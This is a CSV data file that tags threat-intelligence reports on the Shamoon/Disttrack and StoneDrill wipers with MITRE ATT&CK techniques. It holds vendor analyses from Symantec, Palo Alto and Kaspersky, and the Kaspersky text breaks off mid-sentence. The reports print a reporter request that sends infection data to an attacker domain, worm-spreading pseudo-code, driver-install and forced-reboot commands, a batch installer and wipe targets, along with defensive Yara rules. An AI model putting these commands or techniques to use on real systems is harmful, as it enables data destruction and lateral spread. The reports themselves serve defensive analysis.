url,mitre_domain,tactic_name,tech_name,tech_id,text,software_id
https://www.symantec.com/connect/blogs/shamoon-attacks,['enterprise-attack'],['impact'],"['Disk Structure Wipe', 'Data Destruction', 'Disk Structure Wipe']","['T1487', 'T1485', 'T1561.002', 'T1058', 'T1574.011', 'T1031']","
Endpoint Protection - Symantec Enterprise
Products
Applications
Support
Company
How To Buy
Skip to main content (Press Enter).
Sign in
Skip auxiliary navigation (Press Enter).
Register
Skip main navigation (Press Enter).
Toggle navigation
Search Options
HomeMy CommunitiesCommunities All CommunitiesEnterprise SoftwareMainframe SoftwareSymantec EnterpriseBlogs All BlogsEnterprise SoftwareMainframe SoftwareSymantec EnterpriseEvents All EventsEnterprise SoftwareMainframe SoftwareSymantec EnterpriseWater CoolerGroups Enterprise SoftwareMainframe SoftwareSymantec EnterpriseMembers
Endpoint Protection
Â View Only
Community Home
Threads
Library
Events
Members
Back to Library
The Shamoon Attacks
1
Recommend
Aug 16, 2012 11:37 AM
A L Johnson
W32.Disttrack is a new threat that is being used in specific targeted attacks against at least one organization in the energy sector.
It is a destructive malware that corrupts files on a compromised computer and overwrites the MBR (Master Boot Record) in an effort to render a computer unusable.
W32.Disttrack consists of several components:
Dropper—the main component and source of the original infection. It drops a number of other modules.
Wiper—this module is responsible for the destructive functionality of the threat.
Reporter—this module is responsible for reporting infection information back to the attacker.
Dropper Component
The Dropper component performs the following actions:
Copies itself to %System%\trksvr.exe
Drops the following files embedded into resources:
A 64-bit version of the dropper component: %System%\trksrv.exe (contained in the “X509” resource)
Reporter component: %System%\netinit.exe (contained in the ""PKCS7"" resource)
Wiper component: %System%\[NAME SELECTED FROM LIST].exe (contained in the ""PKCS12"" resource)
Note: The name of the component is selected from the following list:
caclsrv
certutl
clean
ctrl
dfrag
dnslookup
dvdquery
event
extract
findfile
fsutl
gpget
iissrv
ipsecure
msinit
ntx
ntdsutl
ntfrsutil
ntnw
power
rdsadmin
regsys
routeman
rrasrv
sacses
sfmsc
sigver
smbinit
wcscript
Copies itself to the following network shares:
ADMIN$
C$\\WINDOWS
D$\\WINDOWS
E$\\WINDOWS
Creates a task to execute itself
Creates the following service to start itself whenever Windows starts:
Service name: TrkSvr
Display name: Distributed Link Tracking Server
Image path: %System%\trksvr.exe
Wiper Component
The Wiper component includes the following functionality:
Deletes an existing driver from the following location and overwrites it with another legitimate driver:
%System%\drivers\drdisk.sys
The device driver is a clean disk driver that enables user-mode applications to read and write to disk sectors. The driver is used to overwrite the computer’s MBR but may be used for legitimate purposes.
The file is digitally signed
Executes the following commands that collect file names, which will be overwritten and writes them to f1.inf and f2.inf:
Files from the f1.inf and f2.inf will be overwritten with the JPEG image shown below. Overwritten files are thus rendered useless.
Figure 1. Image used to overwrite files
Finally, the component will overwrite the MBR so that the compromised computer can no longer start
The following string that points to the location of debug symbols was left in the Wiper component of this threat and gives an idea of where the component was located on the developer’s computer:
C:\Shamoon\ArabianGulf\wiper\release\wiper.pdb
Reporter Component
The Reporter component is responsible for sending infection information back to the attacker. Information is sent as a HTTP GET request and is structured as follows:
http://[DOMAIN]/ajax_modal/modal/data.asp?mydata=[MYDATA]&uid=[UID]&state=[STATE]
The following data is sent to the attacker:
[DOMAIN]—a domain name
[MYDATA]—a number that specifies how many files were overwritten
[UID]—the IP address of the compromised computer
[STATE]—a random number
Threats with such destructive payloads are unusual and are not typical of targeted attacks. Symantec Security Response is continuing to analyze this threat and will post more information as it becomes available. Symantec customers are protected from this threat, which our security products detect as W32.Disttrack.
Statistics
0
Favorited
0
Views
0
Files
0
Shares
0
Downloads
Tags and Keywords
Related Entries and Links
No Related Resource entered.
Products
Applications
Support
Company
How To Buy
Copyright Â© 2005-2022 Broadcom. All Rights Reserved. The term ""Broadcom"" refers to Broadcom Inc. and/or its subsidiaries. Hosted by Higher Logic, LLC on the behalf of Broadcom - Privacy Policy | Cookie Policy | Supply Chain Transparency
Terms of Use
Copyright 2019. All rights reserved.
Powered by Higher Logic
",[]
http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/,['enterprise-attack'],"['impact', 'defense-evasion']","['Disk Structure Wipe', 'Masquerade Task or Service', 'Data Destruction', 'Disk Structure Wipe']","['T1487', 'T1036.004', 'T1485', 'T1561.002']","
Shamoon 2: Return of the Disttrack Wiper
Protect Against Russia-Ukraine Cyber Activity
Menu
Tools
ATOMs
Security Consulting
About Us
Under Attack?
Shamoon 2: Return of the Disttrack Wiper
75,737
people reacted
1
9
min. read
Share
By Robert Falcone
November 30, 2016 at 5:20 PM
Category: Unit 42
Tags: Disttrack Wiper, EMEA, Saudi Arabia, Shamoon 2, threat intelligence
This post is also available in:
日本語 (Japanese)In August 2012, an attack campaign known as Shamoon targeted a Saudi Arabian energy company to deliver a malware called Disttrack. Disttrack is a multipurpose tool that exhibits worm-like behavior by attempting to spread to other systems on a local network using stolen administrator credentials. More importantly, its claim to fame is the ability to destroy data and to render infected systems unusable. The attack four years ago resulted in 30,000 or more systems being damaged.
Last week, Unit 42 came across new Disttrack samples that appear to have been used in an updated attack campaign. The attack targeted at least one organization in Saudi Arabia, which aligns with the targeting of the initial Shamoon attacks. It appears the purpose of the new Disttrack samples were solely focused on destruction, as the samples were configured with a non-operational C2 server to report to and were set to begin wiping data exactly on 2016/11/17 20:45. In another similarity to Shamoon, this is the end of the work week in Saudi Arabia (their work week is from Sunday to Thursdays), so the malware had potentially the entire weekend to spread.
The 2012 Shamoon attacks took place on Lailat al Qadr, the holiest night of the year for Muslims; another time the attackers could be reasonably certain employees would not be at work.
Composition of Disttrack
Disttrack is comprised of three distinct parts: the dropper, communications and wiper components. The main Disttrack executable is a dropper that extracts additional tools from embedded resources and coordinates when to save and execute them. Embedded within each Disttrack sample is a component responsible for communicating with a C2 server and a separate component used to carry out the wiping functionality.
The dropper extracts the communications and wiper components from resources named ""PKCS7"" and ""PKCS12"" respectively, while the x86 sample extracts the x64 variant of Disttrack from a resource named “X509”. To extract the components, the dropper is configured to seek specific offsets within the resource, read a specified number of bytes and decrypt the contents using a specified key. The key exists in the sample as a base64 encoded string that the dropper will decode then use each byte of the resulting string to XOR the data obtained from the resource. When determining the location of the ciphertext within the resource, the dropper subtracts 14 from the offset value in the sample's configuration as an additional layer of obfuscation. Table 1 shows the resources within the Disttrack x86 sample, the component it contains and the values needed to decrypt its contents.
Component
Resource Name
Offset
Size
Base64 key
x64 Variant
X509
812 -14 = 798
717312
5tGLQqku0m02...
Communications
PKCS7
879 -14 = 865
159744
UPi0IzQOAyiL...
Wiper
PKCS12
792 -14 = 778
282112
3Lmqr/nJgzFZ7...
Table 1 Resources containing Disttrack components
Disttrack Functionality
Disttrack is mainly focused on data destruction and attempting to damage as many systems as possible. To do so, this malware attempts to spread to other systems on network using what are likely stolen administrator credentials. This is again similar to the 2012 Shamoon attacks, where compromised but legitimate credentials obtained in advance of the attacks were also hard coded into the malware to aid in its propagation. Disttrack also has the ability to download and execute additional applications to the system, as well as remotely set the date to start wiping systems.
Local Network Spreading
The Disttrack malware spreads to other systems automatically using stolen credentials. The Disttrack we analyzed contained the internal domain names and administrator credentials associated with the targeted organization. The internal domain and credentials appear to be stolen prior to the creation of this tool, as it is not a public domain and the credentials are not weak enough to have obtained through guessing, brute force or dictionary attacks.
Disttrack uses the internal domain names and credentials to log into remote systems on the same network segment. The malware determines the local network segment associated with the target system (call to gethostname) by obtaining the IP address for the system (call to gethostbyname). It then uses the system's IP addresses to enumerate the /24 network (x.x.x.0-255) that the system is networked with, and will attempt to spread to each of these remote systems.
The dropper then attempts to open the service manager on each remote system to start the RemoteRegistry service, which it will connect to using RegConnectRegistryW. Once connected, the dropper attempts to disable UAC (User Access Control) remote restrictions by setting the following registry key to a value of ""1"":
SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
After disabling UAC, the dropper connects to the remote system (using NetUseAdd) and logs in using the embedded stolen credentials. The dropper then checks to see if it has administrator privileges on the remote system by attempting to open ""\system32\csrss.exe"", which allows it to determine if it can write its payload to the ""\system32"" folder on the remote system. The dropper then has two different methods in which it can pivot to the remote system.
The first method involves the dropper writing itself to ""\system32\ntssrvr32.exe"" on the remote system. After writing itself to the remote system, the dropper creates a service named ""ntssrv"", with a display name of ""Microsoft Network Realtime Inspection Service"" and a description of ""Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols"" to execute the payload.
The second, alternative method also involves the dropper copying itself to ""\system32\ntssrvr32.exe"" on the remote system; however, instead of creating a remote service, this method calls the NetScheduleJobAdd function within the Windows netapi32 library to create a scheduled task to run the payload. Scheduled tasks require a time in which the task will run, which the dropper determines by calling the function NetRemoteTOD to obtain the time of day from the remote system. The dropper then adds 90 seconds to the time of day value on the remote system and uses this value as the ""JobTime"" to run the task in three minutes, which executes the payload on the remote system. The following pseudo-code shows the scheduled task creation process:
NetRemoteTOD(UncServerName, &BufferPtr)
NetApiBufferAllocate(0x10u, &AT_INFO)
AT_INFO->Command = s_pathToPayload;
AT_INFO->JobTime = 1000
* (BufferPtr->tod_secs
+ 60 * (BufferPtr->tod_mins + 60 * BufferPtr->tod_hours - BufferPtr->tod_timezone)
+ 90);
AT_INFO->Flags = JOB_NONINTERACTIVE;
AT_INFO->DaysOfMonth = 0;
AT_INFO->DaysOfWeek = 0;
NetScheduleJobAdd(UncServerName, AT_INFO, &v16)
1234567891011
NetRemoteTOD(UncServerName, &BufferPtr)NetApiBufferAllocate(0x10u, &AT_INFO)AT_INFO->Command = s_pathToPayload;AT_INFO->JobTime = 1000 * (BufferPtr->tod_secs
+ 60 * (BufferPtr->tod_mins + 60 * BufferPtr->tod_hours - BufferPtr->tod_timezone)
+ 90);AT_INFO->Flags = JOB_NONINTERACTIVE;AT_INFO->DaysOfMonth = 0;AT_INFO->DaysOfWeek = 0;NetScheduleJobAdd(UncServerName, AT_INFO, &v16)
C2 Communications
Disttrack extracts the communication component from its resource named “PKCS7”, decrypts it and saves the resulting cleartext to the file %WINDOWS%\system32\netinit.exe.
The communication module interacts with its C2 server using HTTP requests. The communications modules in both the x86 and x64 variants of Disttrack we analyzed were configured to use “1.1.1.1:8080” for its C2 server, which does not host an operational Disttrack C2 server. The lack of an operational C2 server suggests that the threat actors did not desire remote access to infected systems, rather the actors sought to render them unusable instead. If the modules were configured with an operational C2 server,
the module would generate an HTTP GET request that resembles the following:
The interesting part of the request above is that the host ""server"", the URL ""category/page.php"", the parameter ""shinu"" and the user-agent ""Mozilla/5.0 (MSIE 7.1; Windows NT 6.0)"" are hardcoded into the tool. The data in ""shinu"" parameter is a combination of the system's tickcount, local IP address, operating system version, keyboard layout and the contents of %WINDOWS%\inf\netimm173.pnf. The C2 server can respond to this HTTP request with one of the following two commands:
Command
Description
E
Provides an executable to run on the system. The executable is saved to %TEMP%\Temp\filer\<tickcount>.exe
T
Sets the time to start wiping the system, by writing the date to %WINDOWS%\inf\usbvideo324.pnf.
We believe the HTTP host value of ""server"" and the non-operational ""1.1.1.1"" C2 address may suggest that the communication module is created with a builder tool, which in this case the actor mistakenly or purposefully did not provide an active C2 server when building this module. While completely speculative, the word “shinu” used as a parameter could be a reference to the Arabic slang for the word “what”, as well as a reference to a village name in northwestern Iran.
Disttrack Data Destruction
The Disttrack dropper is responsible for installing the wiper component of this Trojan, however, it will only activate this component if the system time is greater than a preset date. The dropper obtains a date used to activate the wiping functionality by reading a specific file, or using a hardcoded timestamp of ""2016/11/17 20:45"". The file containing this timestamp is named ""\inf\usbvideo324.pnf"", which is not initially installed but is provided by the C2 server if it sends the communications module the ""T"" command. The ""usbvideo324.pnf"" file would have the following structure:
BYTE year;
BYTE month;
BYTE day;
BYTE hour;
BYTE year;
BYTE minute;
If the dropper determines the system date is larger than the specified date, the dropper will extract the wiper component from a resource named ""PKCS12"" and save it to the ""system32"" folder with one of the following filenames appended with a "".exe"" extension:
caclsrv
certutl
clean
ctrl
dfrag
dnslookup
dvdquery
event
findfile
gpget
ipsecure
iissrv
msinit
ntfrsutil
ntdsutl
power
rdsadmin
regsys
sigver
routeman
rrasrv
sacses
sfmsc
smbinit
wcscript
ntnw
netx
fsutl
extract
The dropper then runs the wiper component with a command line argument of ""1"". The wiper component extracts a driver from its resource section and decrypts it with a 226 byte XOR key. The wiper saves the extracted driver to ""C:\Windows\System32\Drivers\drdisk.sys"" and installs the kernel driver by creating a service named ""drdisk"" with the following command line commands:
sc create drdisk type= kernel start= demand binpath=
System32\Drivers\drdisk.sys 2>&1 >nul
sc start drdisk 2>&1 >nul
123
sc create drdisk type= kernel start= demand binpath= System32\Drivers\drdisk.sys 2>&1 >nulsc start drdisk 2>&1 >nul
The kernel driver is a commercial product that the attackers are abusing called RawDisk by EldoS Corporation, which provides direct access to files, disks and partitions. It appears that the “drdisk.sys” driver (SHA256: 4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6) is the exact same driver as used in the Shamoon attack in 2012. With the kernel driver installed, the wiper can begin writing to protected system locations, such as the master boot record (MBR) and partition tables of storage volumes. The wiper can be configured to overwrite files in three different ways, specified by a configuration setting of ""F"", ""R"" or ""E"". If configured with the ""F"" setting, the wiper loads a resource named AJKEOA, which extracts a JPEG image to use to overwrite files and partition tables. If the wiper is configured with the ""E"" setting, the wiper will encrypt the contents of the file using a random value as a key and the RC4 algorithm. If configured with the ""R"" setting, the wiper will overwrite files with the random values that would be used as a key in ""E"".
The sample we analyzed was configured with ""F"", meaning it would overwrite files with an image obtained from its resource section. The image extracted is a picture of a Syrian boy named Alan Kurdi, whose drowning on September 2, 2015 received international attention in regards to the ongoing Syrian refugee crisis. The previous Shamoon attack in 2012 used an image of a burning American flag, continuing the political image theme.
From a functionality standpoint, the wiper relies on EldoS' RawDisk driver to overwrite files on the system. During this activity, we noticed the wiper changing the system time to August 2012, as the temporary license key for the RawDisk driver requires the system time to not exceed the month of August, which is when the temporary license would expire. This modification to the system time was seen in the previous campaign, and the temporary license key within the wiper component is the exact same as wiper component from the 2012 attacks. The wiper itself queries the following registry keys to obtain a list of partitions to overwrite:
HKLM\SYSTEM\CurrentControlSet\Control\FirmwareBootDevice
HKLM\SYSTEM\CurrentControlSet\Control\SystemBootDevice
12
HKLM\SYSTEM\CurrentControlSet\Control\FirmwareBootDeviceHKLM\SYSTEM\CurrentControlSet\Control\SystemBootDevice
In addition to these partitions, the wiper attempts to overwrite files and subfolders within in the following folders:
C:\Documents and Settings
C:\Users
C:\Windows\System32\Drivers
C:\Windows\System32\Config\systemprofile
1234
C:\Documents and SettingsC:\UsersC:\Windows\System32\DriversC:\Windows\System32\Config\systemprofile
After overwriting these files and the partition tables, the wiper issues the following command to restart the system:
shutdown -r -f -t 2
1
shutdown -r -f -t 2
The arguments and switches used in the “shutdown” command above forces all running applications to close and causes the system to reboot (‘-r’) after 2 seconds (‘-t 2’). This command does result in a dialog prompt, seen in Figure 1, that informs the user that the system is shutting down.
Figure 1 Dialog prompt displayed when the Wiper component runs the 'shutdown' command
With the partition tables overwritten, the system will no longer be able to properly boot, which renders the system unusable. During analysis, our analysis system was rendered unusable, as the virtual machine was unable to find the operating system during boot up, as seen in Figure 2.
Figure 2 Analysis virtual machine unable to boot after executing Disttrack Wiper
Conclusion
After a four year hiatus, threat actors likely associated with the Shamoon attack campaign have used their Disttrack malware to target at least one organization in Saudi Arabia. The current attack campaign has several TTP overlaps with the original Shamoon campaign, especially from a targeting and timing perspective. Also, Disttrack malware used in the recent attacks is very similar to the variant used in the 2012 attacks, which uses the exact same RawDisk device driver as well (down to the same, temporary license key).. The main purpose of the Disttrack malware is to overwrite files and storage partitions in an attempt to destroy data and render the system unusable. To maximize its destruction, the Disttrack tool attempts to spread to other systems on the network using stolen administrator credentials, which suggests that the threat actors had previous access to the network or carried out successful phishing attacks prior to the attack using Disttrack.
Palo Alto Networks customers are protected from Disttrack:
All known samples have a malicious verdict in WildFire
AutoFocus customers can monitor Disttrack activity via the Disttrack tag
Indicators of Compromise
Disttrack Droppers
47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34 (x64)
394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b
(x86)
Communication Components
772ceedbc2cacf7b16ae967de310350e42aa47e5cef19f4423220d41501d86a5 (x64)
61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842 (x86)
Wiper Components
c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a (x64)
128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd (x86)
EldoS RawDisk Samples
5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a (x64)
4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6 (x86)
Get updates from
Palo Alto Networks!
Sign up to receive the latest news, cyber threat intelligence and research from us
Please enter your email address!
Please mark, I'm not a robot!
By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
Popular ResourcesResource Center
Blog
Communities
Tech Docs
Unit 42
Sitemap
Legal NoticesPrivacy
Terms of Use
Documents
AccountManage Subscriptions
Report a Vulnerability
© 2022 Palo Alto Networks, Inc. All rights reserved.
",[]
https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf,"['enterprise-attack', 'Enterprise']",['impact'],"['Disk Structure Wipe', 'Data Destruction', 'Disk Structure Wipe', 'Command and Scripting Interpreter: Visual Basic', 'Data Destruction', 'Indicator Removal on Host: File Deletion', 'Ingress Tool Transfer', 'Obfuscated Files or Information', 'Process Injection', 'Query Registry', 'Screen Capture', 'Software Discovery: Security Software Discovery', 'System Information Discovery', 'System Time Discovery', 'Virtualization/Sandbox Evasion', 'Windows Management Instrumentation']","['T1487', 'T1485', 'T1561.002', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047', 'T1059', 'T1485', 'T1070', 'T1105', 'T1027', 'T1055', 'T1012', 'T1113', 'T1518', 'T1082', 'T1124', 'T1497', 'T1047']","FROM SHAMOON TO STONEDRILL
Wipers attacking Saudi organi zations and beyond
Version 1.05
2017-03-07,
Contact:
intelreports@kaspersky.com
1
Beginning in November 2016, Kaspersky Lab observed a new wave of wiper attacks
directed at
multiple targets in the Middle East. The malware used in the new attacks was a variant of the
infamous
Shamoon
worm that targeted Saudi Aramco and Rasgas back in 2012.
Dormant for four years, one of the most mysterious wipers in history has returned.
So far, we
have
observed three waves of attacks of the Shamoon 2.0 malware, activated on 17
November 2016, 29 Nove
mber 2016 and 23 January 2017.
Also known as Disttrack, Shamoon is a highly destructive malware family that effectively wipes
the victim machine. A group known as the
Cutting Sword of Justice
took credit for the Saudi
Aramco attack by posting a
Pastebin message
on the day of the attack (back in 2012)
,
and
justified the attack as a measure against the Saudi monarchy.
The
Shamoon 2.0 attacks observed
since November 2016 have targeted
organizations in
various critic
al and economic sectors in Saudi Arabia. Just like the previous variant, the
Shamoon 2.0 wiper aims for the mass destruction of systems inside targeted organizations.
The new attacks share
many
similarities with the 2012 wave, though featuring new tools a
nd
techniques. During the first stage, the attackers obtain administrator credentials for the victim’s
network. Next, they build a custom wiper (Shamoon 2.0) which leverages these credentials to
spread wide
ly
inside the organization. Finally, on a predefin
ed date, the wiper activates
,
rendering the victim’s machines completely
inoperable
. It should be noted that the final stages
of the attacks have their activity completely automated, without the need for communication with
the
command and control center.
W
hile
i
nvestigating the Shamoon 2.0 attacks, Kaspersky Lab also discovered a previously
unknown wiper malware which appears to be targeting organizations in Saudi Arabia. We’re
calling this new wiper
StoneDrill
. StoneDrill has several “style” similarities t
o Shamoon
,
with
multiple interesting factors and techniques to allow for
the
better evasion of detection. In
addition to suspected Saudi targets, one victim of StoneDrill was observed on the Kaspersky
Security Network (KSN) in Europe. This makes us believe
the threat actor behind StoneDrill is
expanding
its
wiping operations from the Middle East to Europe.
To summarize some of the characteristics of the new wiper attacks, for both Shamoon and
StoneDrill:
●
Shamoon 2.0 includes a fully functional ransomware mo
dule, in addition to its common
wiping functionality.
●
Shamoon 2.0 has both 32
-
bit and 64
-
bit components
.
●
The Shamoon samples we analyzed in January 2017 do not implement any command
and control (C&C) communication; previous ones included a basic C&C functi
onality that
referenced local servers in the victim’s network.
●
StoneDrill
makes heavy use
of evasion techniques to avoid sandbox execution
.
●
While Shamoon embeds Arabic
-
Yemen resource language sections, StoneDrill embeds
mostly Persian resource language sec
tions. Of course, we do not exclude the possibility
of false flags.
●
StoneDrill does not use drivers during deployment (unlike Shamoon)
but
relies on
memory injection of the wiping module into the victim’s preferred browser.
,
Contact:
intelreports@kaspersky.com
2
●
Several similarities exist between Shamoon and StoneDrill
.
●
Multiple similarities were found between StoneDrill and previously analysed
News
B
eef
attacks
.
What is new
in this report?
This report provides new insights into the Shamoon 2.0 and StoneDrill attacks, including:
1.
The discovery techniques and strategies we used for Shamoon and StoneDrill
.
2.
Details on the ransomware functionality found in Shamoon 2.0. This func
tionality is
currently inactive but could be used in future attacks
.
3.
Details on the
newly found
StoneDrill functions, including
its
destructive capabilities
(even with limited user privileges)
.
4.
Details on
the
similarities between malware styles and malware
components
’
source
code found in Shamoon, StoneDrill and NewsBeef
.
,
Contact:
intelreports@kaspersky.com
3
1. From Shamoon to StoneDrill: the discovery
1.1. Shamoon: It’s all about the “resources”
Few people ever expected the return of Shamoon after
four
years of silence. This made the
news
from the Middle East on 17 November 2016 quite surprising
,
and sent multiple
shock
waves
through the industry. After the second wave of attacks, which took place on 29
November 2016, it became quite clear that Shamoon 2.0 was no longer
an isolated
incident,
but
part of a new series of attacks and
we should
expect more waves coming
in
. In order to make
sure
that
Kaspersky Lab customers
were
protected, we started to develop specific detection
strategies and hunt for possible new variants.
To create the new det
ections, we used multiple ideas:
●
The Shamoon wipers have their additional payloads stored as encrypted resources.
●
Just like in 2012, the early Shamoon 2.0 samples used resources with
three
very
specific names
-
""PKCS7"", ""PKCS12"" and ""X509"". Because of thei
r uniqueness it was
relatively easy to find and detect them just by the resource names
and their
high
entropy. Unfortunately, newer versions had random resource names like ""ICO"", ""LANG""
and ""MENU"", so the ability to easily find new samples was lost.
Howev
er, all programmers, especially malware writers, have their own habits, and the authors
of
Shamoon are no exception:
●
Since the Shamoon 1
.0
story
,
from 2012 (6dd571b84470ad9caad30a6a6acf491e)
until
2016 (2cd0a5f1e9bcce6807e57ec8477d222a) many samples had one
additional
encrypted resource with a specific, although non
-
unique name ""101"".
This finding got us thinking
that
the Shamoon attackers can re
-
use this pattern and we’ve
investigated ways of usi
ng this to hunt for new, unknown malware generations from their side.
As researchers, we tested a lot of different approaches to
find similar malicious
samples based
on this
artefact
, and one of them worked unexpectedly. Here’s the logic we used to create
the
detection:
1.
We assumed that for
the
next waves of attack the authors
would
continue to recompile
the
Shamoon 2
.0
version from 2016, while trying to avoid AV detection, so we focused
mostly on the newest Shamoon versions
.
2.
We assumed that the wiper
would
again enumerate all files inside folders, so it
w
ould
still
call Windows API functions FindFirstFile and FindNextFile
.
3.
Because
it uses
encrypted resources, we assumed that it would find and load them with
the Windows API functions FindResource and LoadReso
urce
.
4.
Inside all known
versions of
Shamoon 2
.0
, the resource ""101"" was found, with the
following properties:
●
Level of entropy > 7.8
-
that means the data inside is encrypted or compressed
.
,
Contact:
intelreports@kaspersky.com
4
●
Size about 30
KB
-
we’ve decided to set the minimum limit at 20 KB
.
●
Language = neutral (not set); all other resources had
the
languages ""Arabic
(Yemen)"" or ""English United States""
.
●
Does not contain an unencrypted PE executable file inside
.
After initial testing, we decided to add more search criteria to limit the number
of possible false
positive detections:
●
Shamoon samples had no digital signature, so the sample would be unsigned
.
●
All known Shamoon samples with resource ""101"" had a maximum file size of 370 KB, so
it's reasonable to limit the file size to twice that numbe
r
-
700 KB.
●
The number of resources inside the sample should not be too high
-
less than 15
.
Our favorite malware hunting tool,
Yara
, provides a rule
-
bused approach to create descriptions of
malware
families based on textual or binary patterns
.
Here’s the detection rule we wrote using all the above conditions:
import ""pe""
import ""math""
rule susp_file_enumerator_with_encrypted_resource_101 {
meta:
copyright = ""Kaspersky Lab""
description = ""Generic
detection for samples that enumerate files with encrypted resource
called 101""
hash = ""2cd0a5f1e9bcce6807e57ec8477d222a""
hash = ""c843046e54b755ec63ccb09d0a689674""
version = ""1.4""
strings:
$mz = ""This program cannot be run in DOS mode.""
$a1 = ""Find
FirstFile"" ascii wide nocase
$a2 = ""FindNextFile"" ascii wide nocase
$a3 = ""FindResource"" ascii wide nocase
$a4 = ""LoadResource"" ascii wide nocase
condition:
uint16(0) == 0x5A4D and
all of them and
filesize < 700000 and
pe.number_of_sections
> 4 and
pe.number_of_signatures == 0 and
pe.number_of_resources > 1 and pe.number_of_resources < 15 and
for any i in (0..pe.number_of_resources
-
1):
(
(math.entropy(pe.resources[i].offset, pe.resources[i].length) > 7.8) and
pe.resources[i].id == 1
01 and
pe.resources[i].length > 20000 and
pe.resources[i].language == 0 and
,
Contact:
intelreports@kaspersky.com
5
not ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))
)
}
While running the above Yara rule on Kaspersky
Lab’s
samples selection
,
we
found an
interesting, fresh sample. After a quick analysis, we realized it was yet another wiper
. H
owever,
it was not Shamoon
,
but something different. We’ve decided to call it StoneDrill.
1.2. From StoneDrill to
NewsBeef
Having identified the StoneDrill
sample through the Yara technique above, we started looking
for other possibly related samples.
One Yara technique that
has
proved useful in the past for finding new malware variants is the
development of Yara rules for decrypted malware components. Durin
g attacks, malware
components can be changed to fit the attackers’ requirements
,
so
hunting for decrypted
malware code might help in finding new malware variants or even older samples.
With StoneDrill, we developed several Yara rules for the decrypted payl
oads. Here’s one of our
Yara rules for a decrypted StoneDrill module:
rule StoneDrill_main_sub {
meta:
author
= ""Kaspersky Lab""
description
= ""Rule to detect StoneDrill (decrypted) samples""
hash
= ""d01781f1246fd1b64e09170bd6600fe1""
hash
= ""ac3c25534c076623192b9381f926ba0d""
version
= ""1.0""
strings:
$code = {B8 08 00 FE 7F FF 30 8F 44 24 ?? 68 B4 0F 00 00 FF 15 ?? ?? ?? 00 B8 08 00 FE 7F FF
30 8F 44 24 ?? 8B ?? 24 [1
-
4] 2B ?? 24 [6] F7 ?1 [5
-
12] 00}
condit
ion:
uint16(0) == 0x5A4D and
$code
and
filesize < 5000000
}
Interestingly, this rule allowed us to find a new category of samples, which we previously
connected with a threat actor named News
B
eef. We wrote about
News
B
eef
roughly one year
ago, in relation to another set of attacks against oil and energy companies from the Middle East
.
,
Contact:
intelreports@kaspersky.com
6
Further analysis indicated the malware sam
ples from StoneDrill and News
B
eef appear to be
connected together through numerous internal similarities.
The use of simple logic in conjunction with
a
knowledge of Yara can help attain
a
state
-
of
-
the
-
art
outcome in malware hunting activity. If you would l
ike to learn more, you can join us
for
the Yara
training
""
Hunt APTs with Yara like a GReAT Ninja
""
and the advanced
“
Malware Reverse
Engineering course
”
on April 1
-
2, 2017 in St. Maarten
.
Several private intelligence reports on Shamoon, StoneDrill and NewsBeef are available to
subscribers o
f
Kaspersky Lab’s Private Intelligence Reports
. For more information please
contact:
intelreports@kaspersky.com
,
Contact:
intelreports@kaspersky.com
7
2. Technical details
-
Shamoon 2.0
-
language
usage and possible Yemeni links
Several good technical articles on Shamoon 2.0
have been
published by some of our
colleagues
, including
Palo Alto
,
IBM X
-
Force
,
Symantec
and others.
Throughout this blog we describe some of the technical details of the new Shamoon
2.0 attacks
and what are the most important things that make them stand out. For the analysis we used the
earliest set of samples
,
with
a
hardcoded attack date of 17 November 2016
. H
owever, we’ve
also included details
from the newer samples
, such as hardc
oded credentials.
During deployment in the victim’s environment, the main Shamoon 2.0 wiper module is installed
through a Windows Batch file with the following content:
@echo off
set u100=ntertmgr32.exe
set u200=service
set u800=%~dp0
copy /Y
""%u800%%u100%"" ""%systemroot%
\
system32
\
%u100%"" start /b %systemroot%
\
system32
\
%u100%
%u200%
Interestingly, the sample resources appear to have a language ID of “Arabic (Yemen)”,
suggesting the attackers might be from Yemen. Of course, we should not
disreg
ard
the
possibility that the resource language could be a false flag planted there by the attackers.
2.1. 32
-
bit Shamoon dropper/worm (ntssrvr32.exe)
SHA256
394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b
MD5
5446f46d89124462ae7aca4fce420423
Compiled
2009.02.15 12:31:44 (GMT), VC 2010
Type
I386 Console EXE
Size
1 349 632 bytes
This executable is a worm designed to infect computers connected
to
a Windows domain. To
achieve this, it relies on a list of hardc
oded, previously stolen username/password pairs
belonging to administrators of the targeted domain. All the strings in the malware are obfuscated
,
Contact:
intelreports@kaspersky.com
8
with simple
one
byte ADD operations and are decrypted upon execution. All the dropped files
exhibit file times
altered to match that of the system’s
kernel32.dll
. The module only works if it
is run with exactly one command line parameter, regardless of the parameter. Otherwise, it
simply exits (likely a measure to avoid accidental execution).
If the victim host’s
system “
PROCESSOR_ARCHITECTURE
” environment variable is “
AMD64
”
or “
amd64
”, the module installs its 64
-
